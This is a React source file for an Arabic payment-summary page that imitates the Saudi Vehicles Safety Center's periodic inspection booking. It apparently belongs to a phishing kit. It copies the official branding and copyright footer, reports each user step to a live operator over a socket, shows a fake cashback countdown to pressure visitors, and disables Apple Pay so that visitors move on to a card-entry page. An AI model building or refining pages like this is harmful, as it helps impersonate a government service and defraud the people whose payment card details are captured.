import { useState, useEffect } from "react";
import { useLocation, Link } from "wouter";
import { sendData, navigateToPage, clientNavigate, socket } from "@/lib/store";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CreditCard, Building2, CheckCircle2, FileText, User, Phone, Mail, MapPin } from "lucide-react";

export default function SummaryPayment() {
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState({ hours: 11, minutes: 47, seconds: 43 });
  const [whatsappNumber, setWhatsappNumber] = useState("");

  useEffect(() => {
    socket.value.on("whatsapp:update", (number: string) => {
      setWhatsappNumber(number);
    });
    socket.value.emit("whatsapp:get");
    return () => {
      socket.value.off("whatsapp:update");
    };
  }, []);

  // Get service name from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'خدمة الفحص الفني الدوري';

  // Service prices
  const servicePrices: Record<string, number> = {
    'خدمة الفحص الفني الدوري': 100,
  };

  const servicePrice = servicePrices[serviceName] || 100;
  const vatAmount = Math.round(servicePrice * 0.15);
  const totalAmount = servicePrice + vatAmount;

  // Show popup after 2 seconds
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopup(true);
    }, 2000);
    return () => clearTimeout(popupTimer);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (!showPopup) return;
    const interval = setInterval(() => {
      setCountdown(prev => {
        const totalSeconds = prev.hours * 3600 + prev.minutes * 60 + prev.seconds - 1;
        if (totalSeconds <= 0) {
          clearInterval(interval);
          return { hours: 0, minutes: 0, seconds: 0 };
        }
        return {
          hours: Math.floor(totalSeconds / 3600),
          minutes: Math.floor((totalSeconds % 3600) / 60),
          seconds: totalSeconds % 60,
        };
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [showPopup]);

  useEffect(() => {
    document.title = 'ملخص الطلب والدفع';
    navigateToPage('ملخص الدفع');
    
    setTimeout(() => {
      sendData({
        data: {
          'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
        },
        current: 'الملخص والدفع',
        waitingForAdminResponse: false,
      });
    }, 1000);
  }, [servicePrice]);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;

    setIsProcessing(true);

    sendData({
      data: {
        paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
        serviceName,
        servicePrice,
        vatAmount,
        totalAmount,
      },
      current: 'ملخص الدفع',
      nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === 'card') {
        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
      } else {
        clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>

      {/* Cashback Popup */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowPopup(false)}>
          <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-[90%] mx-auto overflow-hidden" onClick={(e) => e.stopPropagation()}>
            {/* Image */}
            <div className="w-full">
              <img src="/images/cashback-cards.png" alt="كاش باك 30%" className="w-full object-cover" />
            </div>
            {/* Content */}
            <div className="p-6 text-center">
              <h3 className="text-2xl font-bold text-gray-900 mb-2">سارع قبل نهاية العرض!</h3>
              <p className="text-gray-500 mb-4">يتبقى على إنتهاء العرض</p>
              {/* Countdown */}
              <div className="text-4xl font-bold text-[#20744c] mb-6" dir="ltr">
                {String(countdown.hours).padStart(2, '0')}:{String(countdown.minutes).padStart(2, '0')}:{String(countdown.seconds).padStart(2, '0')}
              </div>
              {/* Close Button */}
              <button
                onClick={() => setShowPopup(false)}
                className="w-3/4 py-3 bg-gray-600 text-white rounded-lg font-bold text-lg hover:bg-gray-700 transition-colors"
              >
                إغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header - same as registration page */}
      <header className="bg-white border-b border-gray-200">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <img 
                src="/images/vsc-logo-icon.png" 
                alt="مركز سلامة المركبات" 
                className="w-12 h-12 object-contain"
              />
              <div className="text-right">
                <div className="text-sm font-bold text-gray-800">مركز سلامة المركبات</div>
                <div className="text-xs text-gray-500">Vehicles Safety Center</div>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Title Section */}
      <section className="pt-3 container mx-auto px-4" style={{ color: '#20744c', fontSize: '22px' }}>
        <p className="mb-1 font-bold">خدمة الفحص الفني الدوري</p>
        <p className="pt-1">ملخص الطلب والدفع</p>
      </section>
      
      <main className="flex-1 container py-8">
        <div className="max-w-4xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Order Summary */}
            <div className="lg:col-span-2 space-y-6">
              {/* Service Details */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <FileText className="w-5 h-5 text-green-600" />
                    تفاصيل الخدمة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">اسم الخدمة</span>
                      <span className="font-medium">{serviceName}</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">رسوم الخدمة</span>
                      <span className="font-medium">{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
                      <span className="font-medium">{vatAmount} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-2 bg-green-50 px-3 rounded-lg">
                      <span className="text-green-700 font-bold">المجموع الكلي</span>
                      <span className="text-green-700 font-bold text-xl">{totalAmount} ر.س</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Payment Methods */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <CreditCard className="w-5 h-5 text-green-600" />
                    طريقة الدفع
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Credit Card Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'card'
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-green-300'
                      }`}
                      onClick={() => setSelectedPaymentMethod('card')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'card' ? 'border-green-500' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'card' && (
                            <div className="w-3 h-3 rounded-full bg-green-500" />
                          )}
                        </div>
                        <CreditCard className={`w-8 h-8 ${selectedPaymentMethod === 'card' ? 'text-green-600' : 'text-gray-400'}`} />
                        <div>
                          <p className="font-medium">بطاقة ائتمان / مدى</p>
                          <p className="text-sm text-gray-500">Visa, Mastercard, مدى</p>
                        </div>
                      </div>
                      <div className="flex gap-2 mt-3 justify-center">
                        <img src="/images/banks/visa.png" alt="Visa" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mastercard.png" alt="Mastercard" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mada.png" alt="Mada" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                      </div>
                    </div>

                    {/* Apple Pay Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'transfer'
                          ? 'border-green-500 bg-green-50'
                          : 'border-gray-200 hover:border-green-300'
                      }`}
                      onClick={() => setSelectedPaymentMethod('transfer')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'transfer' ? 'border-green-500' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'transfer' && (
                            <div className="w-3 h-3 rounded-full bg-green-500" />
                          )}
                        </div>
                        <svg className={`w-8 h-8 ${selectedPaymentMethod === 'transfer' ? 'text-black' : 'text-gray-400'}`} viewBox="0 0 24 24" fill="currentColor">
                          <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
                        </svg>
                        <div>
                          <p className="font-medium">Apple Pay</p>
                          <p className="text-sm text-gray-500">الدفع بواسطة Apple Pay</p>
                        </div>
                      </div>
                      {selectedPaymentMethod === 'transfer' && (
                        <p className="text-xs text-red-500 mt-2 text-center">الدفع عن طريق Apple Pay غير متاح حالياً</p>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Sidebar - Order Summary */}
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader className="bg-green-600 text-white rounded-t-lg">
                  <CardTitle className="text-lg">ملخص الطلب</CardTitle>
                </CardHeader>
                <CardContent className="pt-4">
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الخدمة</span>
                      <span className="font-medium text-xs">{serviceName}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الرسوم</span>
                      <span>{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الضريبة</span>
                      <span>{vatAmount} ر.س</span>
                    </div>
                    <hr />
                    <div className="flex justify-between font-bold text-lg">
                      <span>المجموع</span>
                      <span className="text-green-600">{totalAmount} ر.س</span>
                    </div>
                  </div>

                  <Button
                    className="w-full mt-6 bg-green-600 hover:bg-green-700"
                    disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
                    onClick={handlePayment}
                  >
                    {isProcessing ? (
                      <div className="flex items-center gap-2">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                        جاري المعالجة...
                      </div>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4 ml-2" />
                        متابعة الدفع
                      </>
                    )}
                  </Button>

                  <p className="text-xs text-gray-500 text-center mt-4">
                    بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                  </p>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </main>

      {/* Footer - same as registration page */}
      <footer className="text-white pt-8 md:pt-12 pb-6" style={{ backgroundColor: '#044c34' }}>
        <div className="container mx-auto px-4 lg:px-8">
          <div className="grid grid-cols-2 md:grid-cols-3 gap-6 md:gap-8 mb-8 md:mb-10">
            <div className="text-right">
              <h3 className="font-bold mb-4 md:mb-5 text-base md:text-lg">الفحص</h3>
              <ul className="space-y-2 md:space-y-3 text-xs md:text-sm text-white/80">
                <li><a href="#" className="hover:text-white hover:underline">الاستعلام عن الفحص</a></li>
                <li><a href="#" className="hover:text-white hover:underline">المقابل المالي للفحص</a></li>
                <li><a href="#" className="hover:text-white hover:underline">مواقع الفحص</a></li>
                <li><Link to="/new-appointment" className="hover:text-white hover:underline">حجز موعد</Link></li>
              </ul>
            </div>
            <div className="text-right">
              <h3 className="font-bold mb-4 md:mb-5 text-base md:text-lg">الدعم والمساعدة</h3>
              <ul className="space-y-2 md:space-y-3 text-xs md:text-sm text-white/80">
                <li><a href="#" className="hover:text-white hover:underline">الأسئلة الشائعة</a></li>
                <li><a href="#" className="hover:text-white hover:underline">تواصل معنا</a></li>
                <li><a href="#" className="hover:text-white hover:underline">English</a></li>
              </ul>
            </div>
            <div className="text-right col-span-2 md:col-span-1">
              <h3 className="font-bold mb-4 md:mb-5 text-xs md:text-sm">حمل تطبيق: سلامة المركبات | Vehicles Safety</h3>
              <div className="flex gap-3 flex-row-reverse justify-end mb-4 md:mb-6">
                <a href="#" className="bg-black/40 rounded-md px-3 py-1.5 flex items-center gap-1.5 hover:bg-black/50">
                  <div className="text-right">
                    <div className="text-[8px] text-white/70">احصل عليه من</div>
                    <div className="text-xs font-bold">Google Play</div>
                  </div>
                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.6 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z"/>
                  </svg>
                </a>
                <a href="#" className="bg-black/40 rounded-md px-3 py-1.5 flex items-center gap-1.5 hover:bg-black/50">
                  <div className="text-right">
                    <div className="text-[8px] text-white/70">تنزيل من</div>
                    <div className="text-xs font-bold">App Store</div>
                  </div>
                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18.71,19.5C17.88,20.74 17,21.95 15.66,21.97C14.32,22 13.89,21.18 12.37,21.18C10.84,21.18 10.37,21.95 9.1,22C7.79,22.05 6.8,20.68 5.96,19.47C4.25,17 2.94,12.45 4.7,9.39C5.57,7.87 7.13,6.91 8.82,6.88C10.1,6.86 11.32,7.75 12.11,7.75C12.89,7.75 14.37,6.68 15.92,6.84C16.57,6.87 18.39,7.1 19.56,8.82C19.47,8.88 17.39,10.1 17.41,12.63C17.44,15.65 20.06,16.66 20.09,16.67C20.06,16.74 19.67,18.11 18.71,19.5M13,3.5C13.73,2.67 14.94,2.04 15.94,2C16.07,3.17 15.6,4.35 14.9,5.19C14.21,6.04 13.07,6.7 11.95,6.61C11.8,5.46 12.36,4.26 13,3.5Z"/>
                  </svg>
                </a>
              </div>
              <h4 className="font-bold mb-3 md:mb-4 text-xs md:text-sm">ابق على اتصال معنا عبر مواقع التواصل الإجتماعي</h4>
              <div className="flex gap-2 md:gap-3 flex-row-reverse justify-end">
                {/* WhatsApp */}
                {whatsappNumber && (
                  <a
                    href={`https://wa.me/${whatsappNumber.replace(/\D/g, "")}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="w-8 h-8 md:w-9 md:h-9 bg-[#25D366] rounded-full flex items-center justify-center hover:bg-[#20bd5a]"
                  >
                    <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
                  </a>
                )}
                {/* Facebook */}
                <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                  <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                  <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                  <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12.959-.289.089-.05.189-.1.279-.136a.977.977 0 0 1 .401-.064c.309 0 .57.137.72.354a.8.8 0 0 1 .073.721c-.189.443-.777.617-1.006.689l-.061.019c-.349.104-.689.209-.949.374-.195.124-.307.291-.307.464 0 .06.012.12.036.18.33.72.899 1.32 1.559 1.83.36.27.749.5 1.139.66.24.104.479.174.689.209.375.06.6.27.6.51 0 .12-.045.24-.134.36-.375.495-1.229.72-1.889.84-.09.015-.164.045-.224.09-.075.06-.12.15-.149.27-.03.12-.06.27-.089.42-.03.15-.09.3-.224.42-.18.165-.42.24-.674.24a2.7 2.7 0 0 1-.6-.075 4.46 4.46 0 0 0-.899-.12c-.195 0-.375.015-.539.045-.36.075-.689.225-1.049.405-.539.27-1.139.57-1.979.57h-.06c-.84 0-1.439-.3-1.979-.57-.36-.18-.689-.33-1.049-.405a3.03 3.03 0 0 0-.539-.045c-.33 0-.659.045-.899.12a2.7 2.7 0 0 1-.6.075c-.254 0-.494-.075-.674-.24-.134-.12-.194-.27-.224-.42-.03-.15-.06-.3-.089-.42-.03-.12-.075-.21-.149-.27-.06-.045-.134-.075-.224-.09-.66-.12-1.514-.345-1.889-.84a.6.6 0 0 1-.134-.36c0-.24.225-.45.6-.51.21-.035.449-.105.689-.209.39-.16.779-.39 1.139-.66.66-.51 1.229-1.11 1.559-1.83a.52.52 0 0 0 .036-.18c0-.173-.112-.34-.307-.464-.26-.165-.6-.27-.949-.374l-.061-.019c-.229-.072-.817-.246-1.006-.689a.8.8 0 0 1 .073-.721c.15-.217.411-.354.72-.354a.977.977 0 0 1 .401.064c.09.036.19.086.279.136.3.169.659.273.959.289.198 0 .326-.045.401-.09-.008-.165-.018-.33-.03-.51l-.003-.06c-.104-1.628-.23-3.654.299-4.847C7.859 1.069 11.216.793 12.206.793z"/></svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                  <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                  <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                </a>
              </div>
            </div>
          </div>
          <div className="border-t border-white/20 pt-4 md:pt-6 mt-4">
            <div className="flex flex-col md:flex-row-reverse items-center justify-between gap-4 md:gap-6">
              <div className="flex items-center gap-3 md:gap-4">
                <img src="/images/vsc-footer-logo.png" alt="مركز سلامة المركبات" className="h-8 md:h-10 object-contain" />
                <img src="/images/thiqah-logo.png" alt="ثقة لخدمات الأعمال" className="h-8 md:h-10 object-contain" />
                <img src="/images/registered-badge.png" alt="Registered as" className="h-8 md:h-10 object-contain" />
              </div>
              <div className="text-center md:text-right">
                <p className="text-xs md:text-sm text-white/80 mb-1">جميع الحقوق محفوظة الهيئة السعودية للمواصفات والمقاييس والجودة © 2026</p>
                <p className="text-[10px] md:text-xs text-white/60">تم تطويره وصيانته بواسطة ثقة لخدمات الاعمال</p>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
